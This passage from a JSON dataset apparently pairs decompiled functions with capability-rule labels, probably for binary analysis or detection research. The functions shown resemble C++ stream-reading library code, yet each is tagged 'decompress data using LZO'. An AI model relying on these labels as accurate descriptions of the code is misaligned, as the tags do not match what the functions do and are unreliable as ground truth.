= iVar12;\n        }\n        else {\n            iVar9 = *(iVar9 + 0x7c);\n            uVar3 = *puVar10;\n            if (iVar9 == 0) {\ncode_r0x00468a1d:\n                uVar13 = fcn.0049e780();\n                if (uVar13 >> 0x20 == 1) {\n                    fcn.004a36d0(uVar13);\n                    iVar5 = *(*param_2 + -0xc);\n                    puVar1 = param_2 + iVar5 + 0x14;\n                    *puVar1 = *puVar1 | 1;\n                    if ((*(param_2 + iVar5 + 0x10) & 1) != 0) {\n                        fcn.004a3b60();\n                    }\n                    param_2 = fcn.004a3b60();\n                }\n                else {\n                    fcn.004a36d0(uVar13);\n                    iVar5 = *(*param_2 + -0xc);\n                    puVar1 = param_2 + iVar5 + 0x14;\n                    *puVar1 = *puVar1 | 1;\n                    if ((*(param_2 + iVar5 + 0x10) & 1) == 0) {\n                        fcn.004a3840();\n                        iVar9 = param_2 + *(*param_2 + -0xc);\n                        goto code_r0x00468a50;\n                    }\n                    fcn.004a3b60();\n                }\n                fcn.004a3840();\n                uVar7 = fcn.0041b360(param_2);\n                fcn.004a3840();\n                fcn.0041b360(uVar7);\n                *extraout_ECX = 0;\n                iVar5 = *piStack40;\n                iVar9 = *(iVar5 + -0xc) + piStack40;\n                piVar6 = *(iVar9 + 0x14);\n                if (*(iVar9 + 0x14) != NULL) goto code_r0x00468be5;\n                if (*(iVar9 + 0x70) == 0) {\n                    if ((piStack36 != '\\0') || ((*(iVar9 + 0xd) & 0x10) == 0)) goto code_r0x00468c10;\ncode_r0x00468b73:\n                    piVar6 = *(iVar9 + 0x78);\n                    puVar10 = piVar6[2];\n                    if (piVar6[3] < puVar10 || piVar6[3] == puVar10) {\n                        iVar9 = (**(*piVar6 + 0x24))();\n                        iVar5 = *piStack40;\n                        iVar12 = *(iVar5 + -0xc) + piStack40;\n                        puStack120 = *(iVar12 + 0x7c);\n                        if (puStack120 == NULL) goto code_r0x00468c1d;\n                        if (iVar9 == -1) {\ncode_r0x00468bdf:\n                            piVar6 = *(iVar12 + 0x14) | 2;\n                            goto code_r0x00468be5;\n                        }\n                        uVar3 = iVar9;\n                    }\n                    else {\n                        puStack120 = *(iVar9 + 0x7c);\n                        uVar3 = *puVar10;\n                        if (puStack120 == NULL) {\ncode_r0x00468c1d:\n                            uVar13 = fcn.0049e780();\n                            if (uVar13 >> 0x20 == 1) {\n                                fcn.004a36d0(uVar13);\n                                iVar5 = *(*piStack40 + -0xc);\n                                puVar1 = piStack40 + iVar5 + 0x14;\n                                *puVar1 = *puVar1 | 1;\n                                if ((*(piStack40 + iVar5 + 0x10) & 1) != 0) {\n                                    fcn.004a3b60();\n                                }\n                                piStack40 = fcn.004a3b60();\ncode_r0x00468cf5:\n                                fcn.004a3840();\n                                uVar7 = fcn.0041b360(piStack40);\n                                fcn.004a3840();\n                                fcn.0041b360(uVar7);\n                                piVar6 = *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x7c);\n                                if (piVar6 == NULL) {\n                                    fcn.0049e780();\n                                    piVar6 = extraout_ECX_01;\n                                }\n                                else {\n                                    if (*(piVar6 + 7) == '\\0') {\n                                        fcn.00431cc0();\n                                        if (*(*piVar6 + 0x18) != 0x431f70) {\n                                            (**(*piVar6 + 0x18))(10);\n                                        }\n                                    }\n                                    in_stack_ffffff8c = 0x468d58;\n                                    piVar6 = extraout_ECX_00;\n                                }\n                                piVar6[1] = 0;\n                                fcn.00468920(piVar6, 1);\n                                if (cStack153 == '\\0') {\n                                    if (in_stack_ffffff8c < 1) {\n                                        iVar5 = piVar6[1];\n                                    }\n                                    else {\n                                        *puStack120 = 0;\n                                        iVar5 = piVar6[1];\n                                    }\njoined_r0x00469037:\n                                    if (iVar5 != 0) {\n                                        return piVar6;\n                                    }\n                                    uVar8 = 4;\ncode_r0x00468df5:\n                                    fcn.0049c600(uVar8 | *(piVar6 + *(*piVar6 + -0xc) + 0x14));\n                                    return piVar6;\n                                }\n                                piVar2 = *(piVar6 + *(*piVar6 + -0xc) + 0x78);\n                                puVar10 = piVar2[2];\n                                if (piVar2[3] < puVar10 || piVar2[3] == puVar10) {\n                                    uVar8 = (**(*piVar2 + 0x24))();\n                                }\n                                else {\n                                    uVar8 = *puVar10;\n                                }\n                                iVar9 = piVar6[1];\ncode_r0x00468e4c:\n                                iVar5 = iVar9 + 1;\n                                if (iVar5 < in_stack_ffffff8c) {\n                                    do {\n                                        if (uVar8 == 0xffffffff) {\ncode_r0x00468fc0:\n                                            if (0 < in_stack_ffffff8c) {\n                                                *puStack120 = 0;\n                                            }\n                                            iVar9 = piVar6[1];\n                                            goto code_r0x00468fce;\n                                        }\n                                        puStack184 = piVar2[3];\n                                        puVar10 = piVar2[2];\n                                        if (uStack104 == uVar8) goto code_r0x00469010;\n                                        iVar5 = (in_stack_ffffff8c - iVar9) + -1;\n                                        iVar12 = puStack184 - puVar10;\n                                        if (iVar5 <= puStack184 - puVar10) {\n                                            iVar12 = iVar5;\n                                        }\n                                        if (iVar12 < 2) {\n                                            *puStack120 = uVar8;\n                                            puVar4 = piVar2[2];\n                                            puStack120 = puStack120 + 1;\n                                            puVar10 = piVar2[3];\n                                            piVar6[1] = piVar6[1] + 1;\n                                            if (puVar4 < puVar10) {\n                                                puVar4 = puVar4 + 1;\n                                                piVar2[2] = puVar4;\n                                            }\n                                            else {\n                                                iVar5 = (**(*piVar2 + 0x28))();\n                                                if (iVar5 == -1) goto code_r0x00468fc0;\n                                                puVar4 = piVar2[2];\n                                                puVar10 = piVar2[3];\n                                            }\n                                            if (puVar4 < puVar10) {\n                                                uVar8 = *puVar4;\n                                                iVar9 = piVar6[1];\n                                            }\n                                            else {\n                                                uVar8 = (**(*piVar2 + 0x24))();\n                                                iVar9 = piVar6[1];\n                                            }\n                                            goto code_r0x00468e4c;\n                                        }\n                                        puVar4 = sub.msvcrt.dll_memchr(puVar10, uStack104, iVar12);\n                                        if ((puVar4 == NULL) || (iVar12 = puVar4 - puVar10,  iVar12 != 0)) {\n                                            sub.msvcrt.dll_memcpy(puStack120, puVar10, iVar12);\n                                            puStack184 = piVar2[3];\n                                            iVar9 = piVar6[1];\n                                            puVar4 = piVar2[2] + iVar12;\n                                        }\n                                        iVar9 = iVar9 + iVar12;\n                                        piVar2[2] = puVar4;\n                                        puStack120 = puStack120 + iVar12;\n                                        piVar6[1] = iVar9;\n                                        if (puStack184 <= puVar4) goto code_r0x00468f90;\n                                        uVar8 = *puVar4;\n                                        iVar5 = iVar9 + 1;\n                                        if (in_stack_ffffff8c <= iVar5) break;\n                                    } while( true );\n                                }\n                                if (uVar8 == 0xffffffff) {\n                                    if (0 < in_stack_ffffff8c) {\n                                        *puStack120 = 0;\n                                        uVar8 = (-(piVar6[1] == 0) & 4) + 2;\n                                        goto code_r0x00468df5;\n                                    }\ncode_r0x00468fce:\n                                    uVar8 = 2;\ncode_r0x00468fd3:\n                                    if (iVar9 == 0) {\n                                        uVar8 = uVar8 | 4;\n                                    }\n                                    goto code_r0x00468df5;\n                                }\n                                if (uStack104 != uVar8) {\n                                    if (0 < in_stack_ffffff8c) {\n                                        *puStack120 = 0;\n                                        uVar8 = 4;\n                                        goto code_r0x00468df5;\n                                    }\n                                    uVar8 = 4;\n                                    goto code_r0x00468fd3;\n                                }\n                                puStack184 = piVar2[3];\n                                puVar10 = piVar2[2];\ncode_r0x00469010:\n                                piVar6[1] = iVar5;\n                                if (puVar10 < puStack184) {\n                                    piVar2[2] = puVar10 + 1;\n                                    if (0 < in_stack_ffffff8c) {\n                                        *puStack120 = 0;\n                                        iVar5 = piVar6[1];\n                                    }\n                                }\n                                else {\n                                    (**(*piVar2 + 0x28))();\n                                    if (in_stack_ffffff8c < 1) {\n                                        iVar5 = piVar6[1];\n                                    }\n                                    else {\n                                        *puStack120 = 0;\n                                        iVar5 = piVar6[1];\n                                    }\n                                }\n                                goto joined_r0x00469037;\n                            }\n                            fcn.004a36d0(uVar13);\n                            iVar5 = *(*piStack40 + -0xc);\n                            puVar1 = piStack40 + iVar5 + 0x14;\n                            *puVar1 = *puVar1 | 1;\n                            if ((*(piStack40 + iVar5 + 0x10) & 1) != 0) {\n                                fcn.004a3b60();\n                                goto code_r0x00468cf5;\n                            }\n                            fcn.004a3840();\n                            iVar9 = piStack40 + *(*piStack40 + -0xc);\n                            goto code_r0x00468c50;\n                        }\n                    }\n                    if ((*(*(puStack120 + 0x18) + uVar3 * 2) & 0x20) != 0) {\n                        do {\n                            puVar10 = piVar6[3];\n                            if (puVar10 <= piVar6[2]) {\n                                iVar5 = (**(*piVar6 + 0x28))();\n                                if (iVar5 != -1) {\n                                    puVar4 = piVar6[2];\n                                    puVar10 = piVar6[3];\n                                    goto code_r0x00468ba6;\n                                }\ncode_r0x00468bd8:\n                                iVar12 = piStack40 + *(*piStack40 + -0xc);\n                                goto code_r0x00468bdf;\n                            }\n                            puVar4 = piVar6[2] + 1;\n                            piVar6[2] = puVar4;\ncode_r0x00468ba6:\n                            if (puVar4 < puVar10) {\n                                uVar3 = *puVar4;\n                            }\n                            else {\n                                iVar5 = (**(*piVar6 + 0x24))();\n                                if (iVar5 == -1) goto code_r0x00468bd8;\n                                uVar3 = iVar5;\n                            }\n                        } while ((*(*(puStack120 + 0x18) + uVar3 * 2) & 0x20) != 0);\n                        iVar5 = *piStack40;\n                    }\n                    piStack36 = *(piStack40 + *(iVar5 + -0xc) + 0x14);\n                }\n                else {\n                    fcn.00469d50();\n                    iVar5 = *piStack40;\n                    iVar9 = *(iVar5 + -0xc) + piStack40;\n                    if ((piStack36 == '\\0') && ((*(iVar9 + 0xd) & 0x10) != 0)) goto code_r0x00468b73;\ncode_r0x00468c50:\n                    piStack36 = *(iVar9 + 0x14);\n                }\n                piVar6 = piStack36;\n                if (piStack36 == NULL) {\ncode_r0x00468c10:\n                    *extraout_ECX = 1;\n                    return piStack36;\n                }\ncode_r0x00468be5:\n                piVar6 = fcn.0049c600(piVar6 | 4);\n                return piVar6;\n            }\n        }\n        if ((*(*(iVar9 + 0x18) + uVar3 * 2) & 0x20) != 0) {\n            do {\n                puVar10 = piVar6[3];\n                if (puVar10 <= piVar6[2]) {\n                    iVar5 = (**(*piVar6 + 0x28))();\n                    if (iVar5 != -1) {\n                        puVar4 = piVar6[2];\n                        puVar10 = piVar6[3];\n                        goto code_r0x004689a6;\n                    }\ncode_r0x004689d8:\n                    iVar11 = param_2 + *(*param_2 + -0xc);\n                    goto code_r0x004689df;\n                }\n                puVar4 = piVar6[2] + 1;\n                piVar6[2] = puVar4;\ncode_r0x004689a6:\n                if (puVar4 < puVar10) {\n                    uVar3 = *puVar4;\n                }\n                else {\n                    iVar5 = (**(*piVar6 + 0x24))();\n                    if (iVar5 == -1) goto code_r0x004689d8;\n                    uVar3 = iVar5;\n                }\n            } while ((*(*(iVar9 + 0x18) + uVar3 * 2) & 0x20) != 0);\n            iVar5 = *param_2;\n        }\n        param_3 = *(param_2 + *(iVar5 + -0xc) + 0x14);\n    }\n    else {\n        fcn.00469d50();\n        iVar5 = *param_2;\n        iVar9 = *(iVar5 + -0xc) + param_2;\n        if ((param_3 == '\\0') && ((*(iVar9 + 0xd) & 0x10) != 0)) goto code_r0x00468973;\ncode_r0x00468a50:\n        param_3 = *(iVar9 + 0x14);\n    }\n    piVar6 = param_3;\n    if (param_3 == NULL) {\ncode_r0x00468a10:\n        *param_1 = 1;\n        return param_3;\n    }\ncode_r0x004689e5:\n    piVar6 = fcn.0049c600(piVar6 | 4);\n    return piVar6;\ncode_r0x00468f90:\n    uVar8 = (**(*piVar2 + 0x24))();\n    iVar9 = piVar6[1];\n    goto code_r0x00468e4c;\n}\n",
        "token_count": 4262
    },
    "004690c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004690c0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    uint var_9h;\n    \n    in_ECX[1] = 0;\n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 0xfffffffd);\n    fcn.00468920();\n    if (var_9h != '\\0') {\n        iVar3 = *(*in_ECX + -0xc) + in_ECX;\n        piVar1 = *(iVar3 + 0x78);\n        if (piVar1 == NULL) {\ncode_r0x00469152:\n            fcn.0049c600(*(iVar3 + 0x14) | 1);\n            return;\n        }\n        uVar2 = piVar1[2];\n        if ((piVar1[1] < uVar2) && (arg_8h == *(uVar2 - 1))) {\n            piVar1[2] = uVar2 - 1;\n        }\n        else {\n            iVar3 = (**(*piVar1 + 0x2c))(arg_8h);\n            if (iVar3 == -1) {\n                iVar3 = *(*in_ECX + -0xc) + in_ECX;\n                goto code_r0x00469152;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 356
    },
    "004691e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004691e0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    in_ECX[1] = 0;\n    fcn.00468920();\n    if (var_9h != '\\0') {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        iVar2 = piVar1[3] - piVar1[2];\n        if (iVar2 == 0) {\n            iVar2 = (**(*piVar1 + 0x1c))();\n        }\n        if (0 < iVar2) {\n            if (arg_ch < iVar2) {\n                iVar2 = arg_ch;\n            }\n            iVar2 = (**(**(in_ECX + *(*in_ECX + -0xc) + 0x78) + 0x20))(arg_8h, iVar2);\n            in_ECX[1] = iVar2;\n            return iVar2;\n        }\n        if (iVar2 == -1) {\n            fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 2);\n        }\n    }\n    return in_ECX[1];\n}\n",
        "token_count": 337
    },
    "004693d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004693d0(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    in_ECX[0x1e] = 0;\n    *(in_ECX + 0x1f) = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    in_ECX[0x23] = 0;\n    *in_ECX = 0x50a728;\n    in_ECX[2] = 0x50a73c;\n    in_ECX[1] = 0;\n    fcn.0049c4a0(arg_8h);\n    return;\n}\n",
        "token_count": 195
    },
    "00469460": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.00469460(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.0049b670();\n    param_1[0x1e] = 0;\n    *(param_1 + 0x1f) = 0;\n    param_1[0x20] = 0;\n    param_1[0x21] = 0;\n    param_1[0x22] = 0;\n    param_1[0x23] = 0;\n    *param_1 = 0x50a728;\n    param_1[2] = 0x50a73c;\n    param_1[1] = 0;\n    fcn.0049c4a0(0);\n    return;\n}\n",
        "token_count": 185
    },
    "004698b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.004698b0(uint *arg_8h)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    int32_t *extraout_ECX_03;\n    int32_t *extraout_ECX_04;\n    int32_t *extraout_ECX_05;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX_06;\n    uint8_t *puVar8;\n    int32_t iVar9;\n    uchar *puVar10;\n    int32_t unaff_EDI;\n    ulong uVar11;\n    char cStack653;\n    int32_t in_stack_fffffd98;\n    uchar *in_stack_fffffd9c;\n    uint32_t uStack604;\n    uint uVar12;\n    char cStack537;\n    uint32_t uStack536;\n    uint uStack520;\n    int32_t iStack516;\n    int32_t iStack512;\n    uchar *puStack508;\n    int32_t *piStack504;\n    uint uStack500;\n    int32_t *piStack496;\n    uint uStack492;\n    int32_t iStack488;\n    uchar *puStack484;\n    uint uStack480;\n    char cStack453;\n    uint32_t uStack452;\n    uint uStack436;\n    int32_t iStack432;\n    int32_t iStack428;\n    uchar *puStack424;\n    int32_t *piStack420;\n    uint uStack416;\n    int32_t *piStack412;\n    uint uStack408;\n    int32_t iStack404;\n    uchar *puStack400;\n    uint uStack396;\n    char cStack369;\n    uint32_t uStack368;\n    uint uStack352;\n    int32_t iStack348;\n    int32_t iStack344;\n    uchar *puStack340;\n    int32_t *piStack336;\n    uint uStack332;\n    int32_t *piStack328;\n    uint uStack324;\n    int32_t iStack320;\n    uchar *puStack316;\n    uint uStack312;\n    char cStack285;\n    uint32_t uStack284;\n    uint uStack268;\n    int32_t iStack264;\n    int32_t iStack260;\n    uchar *puStack256;\n    int32_t *piStack252;\n    uint uStack248;\n    int32_t *piStack244;\n    uint uStack240;\n    int32_t iStack236;\n    uchar *puStack232;\n    uint uStack228;\n    char cStack201;\n    uint32_t uStack200;\n    uint uStack184;\n    int32_t iStack180;\n    int32_t iStack176;\n    uchar *puStack172;\n    int32_t *piStack168;\n    uint uStack164;\n    int32_t *piStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uchar *puStack148;\n    uint uStack144;\n    char cStack117;\n    uint32_t uStack116;\n    uint uStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    uchar *puStack88;\n    int32_t *piStack84;\n    uint uStack80;\n    int32_t *piStack76;\n    uint uStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    uint *puStack60;\n    uint32_t var_21h;\n    uint var_1ch;\n    uint var_ch;\n    \n    uStack72 = 0;\n    uStack80 = 0x4698ce;\n    piStack76 = in_ECX;\n    fcn.00468920();\n    if (var_21h == '\\0') {\n        return in_ECX;\n    }\n    stack0xffffffdc = 0;\n    iStack96 = *(*in_ECX + -0xc) + in_ECX;\n    if (*(iStack96 + 0x84) != NULL) {\n        piStack84 = *(iStack96 + 0x78);\n        puStack60 = &fcn.004698b0::var_1ch;\n        iStack64 = &fcn.004698b0::var_21h + 1;\n        piStack76 = NULL;\n        uStack72 = 0xffffffff;\n        uStack80 = 0xffffffff;\n        puStack88 = 0x469926;\n        iStack68 = iStack96;\n        (**(**(iStack96 + 0x84) + 0xc))();\n        *arg_8h = var_1ch;\ncode_r0x00469931:\n        if (stack0xffffffdc == 0) {\n            return in_ECX;\n        }\n        piStack84 = stack0xffffffdc | *(in_ECX + *(*in_ECX + -0xc) + 0x14);\n        puStack88 = 0x469956;\n        fcn.0049c600();\n        return in_ECX;\n    }\n    puStack88 = 0x46996a;\n    uVar11 = fcn.0049e780();\n    piStack84 = uVar11;\n    if (uVar11 >> 0x20 == 1) {\n        puStack88 = 0x469994;\n        fcn.004a36d0();\n        iVar9 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar9 + 0x10) & 1) == 0) {\n            puStack88 = 0x4699a8;\n            fcn.004a3b60();\n        }\n        puStack88 = 0x4699ad;\n        in_ECX = fcn.004a3b60();\n    }\n    else {\n        puStack88 = 0x469977;\n        fcn.004a36d0();\n        unaff_EDI = *(*in_ECX + -0xc) + in_ECX;\n        *(unaff_EDI + 0x14) = *(unaff_EDI + 0x14) | 1;\n        if ((*(unaff_EDI + 0x10) & 1) == 0) {\n            puStack88 = 0x46998d;\n            fcn.004a3840();\n            goto code_r0x00469931;\n        }\n        puStack88 = 0x4699b6;\n        fcn.004a3b60();\n    }\n    puStack88 = 0x4699bb;\n    fcn.004a3840();\n    puStack88 = 0x4699c3;\n    piStack84 = in_ECX;\n    uStack100 = fcn.0041b360();\n    puStack88 = 0x4699ca;\n    fcn.004a3840();\n    puStack88 = 0x4699d2;\n    piStack84 = uStack100;\n    fcn.0041b360();\n    uStack156 = 0;\n    uStack164 = 0x466ebe;\n    piStack160 = extraout_ECX_06;\n    iStack92 = unaff_EDI;\n    puStack88 = &stack0xfffffffc;\n    fcn.00468920();\n    if (cStack117 == '\\0') {\n        return extraout_ECX_06;\n    }\n    uStack116 = 0;\n    iStack180 = *(*extraout_ECX_06 + -0xc) + extraout_ECX_06;\n    if (*(iStack180 + 0x84) != NULL) {\n        piStack168 = *(iStack180 + 0x78);\n        uStack144 = uStack80;\n        puStack148 = &stack0xffffff8c;\n        piStack160 = NULL;\n        uStack156 = 0xffffffff;\n        uStack164 = 0xffffffff;\n        puStack172 = 0x466f16;\n        iStack152 = iStack180;\n        (**(**(iStack180 + 0x84) + 0x14))();\ncode_r0x00466f19:\n        if (uStack116 == 0) {\n            return extraout_ECX_06;\n        }\n        piStack168 = uStack116 | *(extraout_ECX_06 + *(*extraout_ECX_06 + -0xc) + 0x14);\n        puStack172 = 0x466f42;\n        fcn.0049c600();\n        return extraout_ECX_06;\n    }\n    puStack172 = 0x466f56;\n    uVar11 = fcn.0049e780();\n    piStack168 = uVar11;\n    if (uVar11 >> 0x20 == 1) {\n        puStack172 = 0x466f80;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            puStack172 = 0x466f94;\n            fcn.004a3b60();\n        }\n        puStack172 = 0x466f99;\n        piVar5 = fcn.004a3b60();\n    }\n    else {\n        puStack172 = 0x466f63;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            puStack172 = 0x466f79;\n            fcn.004a3840();\n            goto code_r0x00466f19;\n        }\n        puStack172 = 0x466fa2;\n        fcn.004a3b60();\n        piVar5 = extraout_ECX_06;\n    }\n    puStack172 = 0x466fa7;\n    fcn.004a3840();\n    puStack172 = 0x466faf;\n    piStack168 = piVar5;\n    uStack184 = fcn.0041b360();\n    puStack172 = 0x466fb6;\n    fcn.004a3840();\n    puStack172 = 0x466fbe;\n    piStack168 = uStack184;\n    fcn.0041b360();\n    uStack240 = 0;\n    uStack248 = 0x466fde;\n    piStack244 = extraout_ECX;\n    iStack176 = unaff_EDI;\n    puStack172 = &stack0xffffffa8;\n    fcn.00468920();\n    if (cStack201 == '\\0') {\n        return extraout_ECX;\n    }\n    uStack200 = 0;\n    iStack264 = *(*extraout_ECX + -0xc) + extraout_ECX;\n    if (*(iStack264 + 0x84) != NULL) {\n        piStack252 = *(iStack264 + 0x78);\n        uStack228 = uStack164;\n        puStack232 = &stack0xffffff38;\n        piStack244 = NULL;\n        uStack240 = 0xffffffff;\n        uStack248 = 0xffffffff;\n        puStack256 = 0x467036;\n        iStack236 = iStack264;\n        (**(**(iStack264 + 0x84) + 0xc))();\ncode_r0x00467039:\n        if (uStack200 == 0) {\n            return extraout_ECX;\n        }\n        piStack252 = uStack200 | *(extraout_ECX + *(*extraout_ECX + -0xc) + 0x14);\n        puStack256 = 0x467062;\n        fcn.0049c600();\n        return extraout_ECX;\n    }\n    puStack256 = 0x467076;\n    uVar11 = fcn.0049e780();\n    piStack252 = uVar11;\n    if (uVar11 >> 0x20 == 1) {\n        puStack256 = 0x4670a0;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            puStack256 = 0x4670b4;\n            fcn.004a3b60();\n        }\n        puStack256 = 0x4670b9;\n        piVar5 = fcn.004a3b60();\n    }\n    else {\n        puStack256 = 0x467083;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            puStack256 = 0x467099;\n            fcn.004a3840();\n            goto code_r0x00467039;\n        }\n        puStack256 = 0x4670c2;\n        fcn.004a3b60();\n        piVar5 = extraout_ECX;\n    }\n    puStack256 = 0x4670c7;\n    fcn.004a3840();\n    puStack256 = 0x4670cf;\n    piStack252 = piVar5;\n    uStack268 = fcn.0041b360();\n    puStack256 = 0x4670d6;\n    fcn.004a3840();\n    puStack256 = 0x4670de;\n    piStack252 = uStack268;\n    fcn.0041b360();\n    uStack324 = 0;\n    uStack332 = 0x4670fe;\n    piStack328 = extraout_ECX_00;\n    iStack260 = unaff_EDI;\n    puStack256 = &stack0xffffff54;\n    fcn.00468920();\n    if (cStack285 == '\\0') {\n        return extraout_ECX_00;\n    }\n    uStack284 = 0;\n    iStack348 = *(*extraout_ECX_00 + -0xc) + extraout_ECX_00;\n    if (*(iStack348 + 0x84) != NULL) {\n        piStack336 = *(iStack348 + 0x78);\n        uStack312 = uStack248;\n        puStack316 = &stack0xfffffee4;\n        piStack328 = NULL;\n        uStack324 = 0xffffffff;\n        uStack332 = 0xffffffff;\n        puStack340 = 0x467156;\n        iStack320 = iStack348;\n        (**(**(iStack348 + 0x84) + 0x18))();\ncode_r0x00467159:\n        if (uStack284 == 0) {\n            return extraout_ECX_00;\n        }\n        piStack336 = uStack284 | *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x14);\n        puStack340 = 0x467182;\n        fcn.0049c600();\n        return extraout_ECX_00;\n    }\n    puStack340 = 0x467196;\n    uVar11 = fcn.0049e780();\n    piStack336 = uVar11;\n    if (uVar11 >> 0x20 == 1) {\n        puStack340 = 0x4671c0;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            puStack340 = 0x4671d4;\n            fcn.004a3b60();\n        }\n        puStack340 = 0x4671d9;\n        piVar5 = fcn.004a3b60();\n    }\n    else {\n        puStack340 = 0x4671a3;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            puStack340 = 0x4671b9;\n            fcn.004a3840();\n            goto code_r0x00467159;\n        }\n        puStack340 = 0x4671e2;\n        fcn.004a3b60();\n        piVar5 = extraout_ECX_00;\n    }\n    puStack340 = 0x4671e7;\n    fcn.004a3840();\n    puStack340 = 0x4671ef;\n    piStack336 = piVar5;\n    uStack352 = fcn.0041b360();\n    puStack340 = 0x4671f6;\n    fcn.004a3840();\n    puStack340 = 0x4671fe;\n    piStack336 = uStack352;\n    fcn.0041b360();\n    uStack408 = 0;\n    uStack416 = 0x46721e;\n    piStack412 = extraout_ECX_01;\n    iStack344 = unaff_EDI;\n    puStack340 = &stack0xffffff00;\n    fcn.00468920();\n    if (cStack369 == '\\0') {\n        return extraout_ECX_01;\n    }\n    uStack368 = 0;\n    iStack432 = *(*extraout_ECX_01 + -0xc) + extraout_ECX_01;\n    if (*(iStack432 + 0x84) != NULL) {\n        piStack420 = *(iStack432 + 0x78);\n        uStack396 = uStack332;\n        puStack400 = &stack0xfffffe90;\n        piStack412 = NULL;\n        uStack408 = 0xffffffff;\n        uStack416 = 0xffffffff;\n        puStack424 = 0x467276;\n        iStack404 = iStack432;\n        (**(**(iStack432 + 0x84) + 0x10))();\ncode_r0x00467279:\n        if (uStack368 == 0) {\n            return extraout_ECX_01;\n        }\n        piStack420 = uStack368 | *(extraout_ECX_01 + *(*extraout_ECX_01 + -0xc) + 0x14);\n        puStack424 = 0x4672a2;\n        fcn.0049c600();\n        return extraout_ECX_01;\n    }\n    puStack424 = 0x4672b6;\n    uVar11 = fcn.0049e780();\n    piStack420 = uVar11;\n    if (uVar11 >> 0x20 == 1) {\n        puStack424 = 0x4672e0;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            puStack424 = 0x4672f4;\n            fcn.004a3b60();\n        }\n        puStack424 = 0x4672f9;\n        piVar5 = fcn.004a3b60();\n    }\n    else {\n        puStack424 = 0x4672c3;\n        fcn.004a36d0();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            puStack424 = 0x4672d9;\n            fcn.004a3840();\n            goto code_r0x00467279;\n        }\n        puStack424 = 0x467302;\n        fcn.004a3b60();\n        piVar5 = extraout_ECX_01;\n    }\n    puStack424 = 0x467307;\n    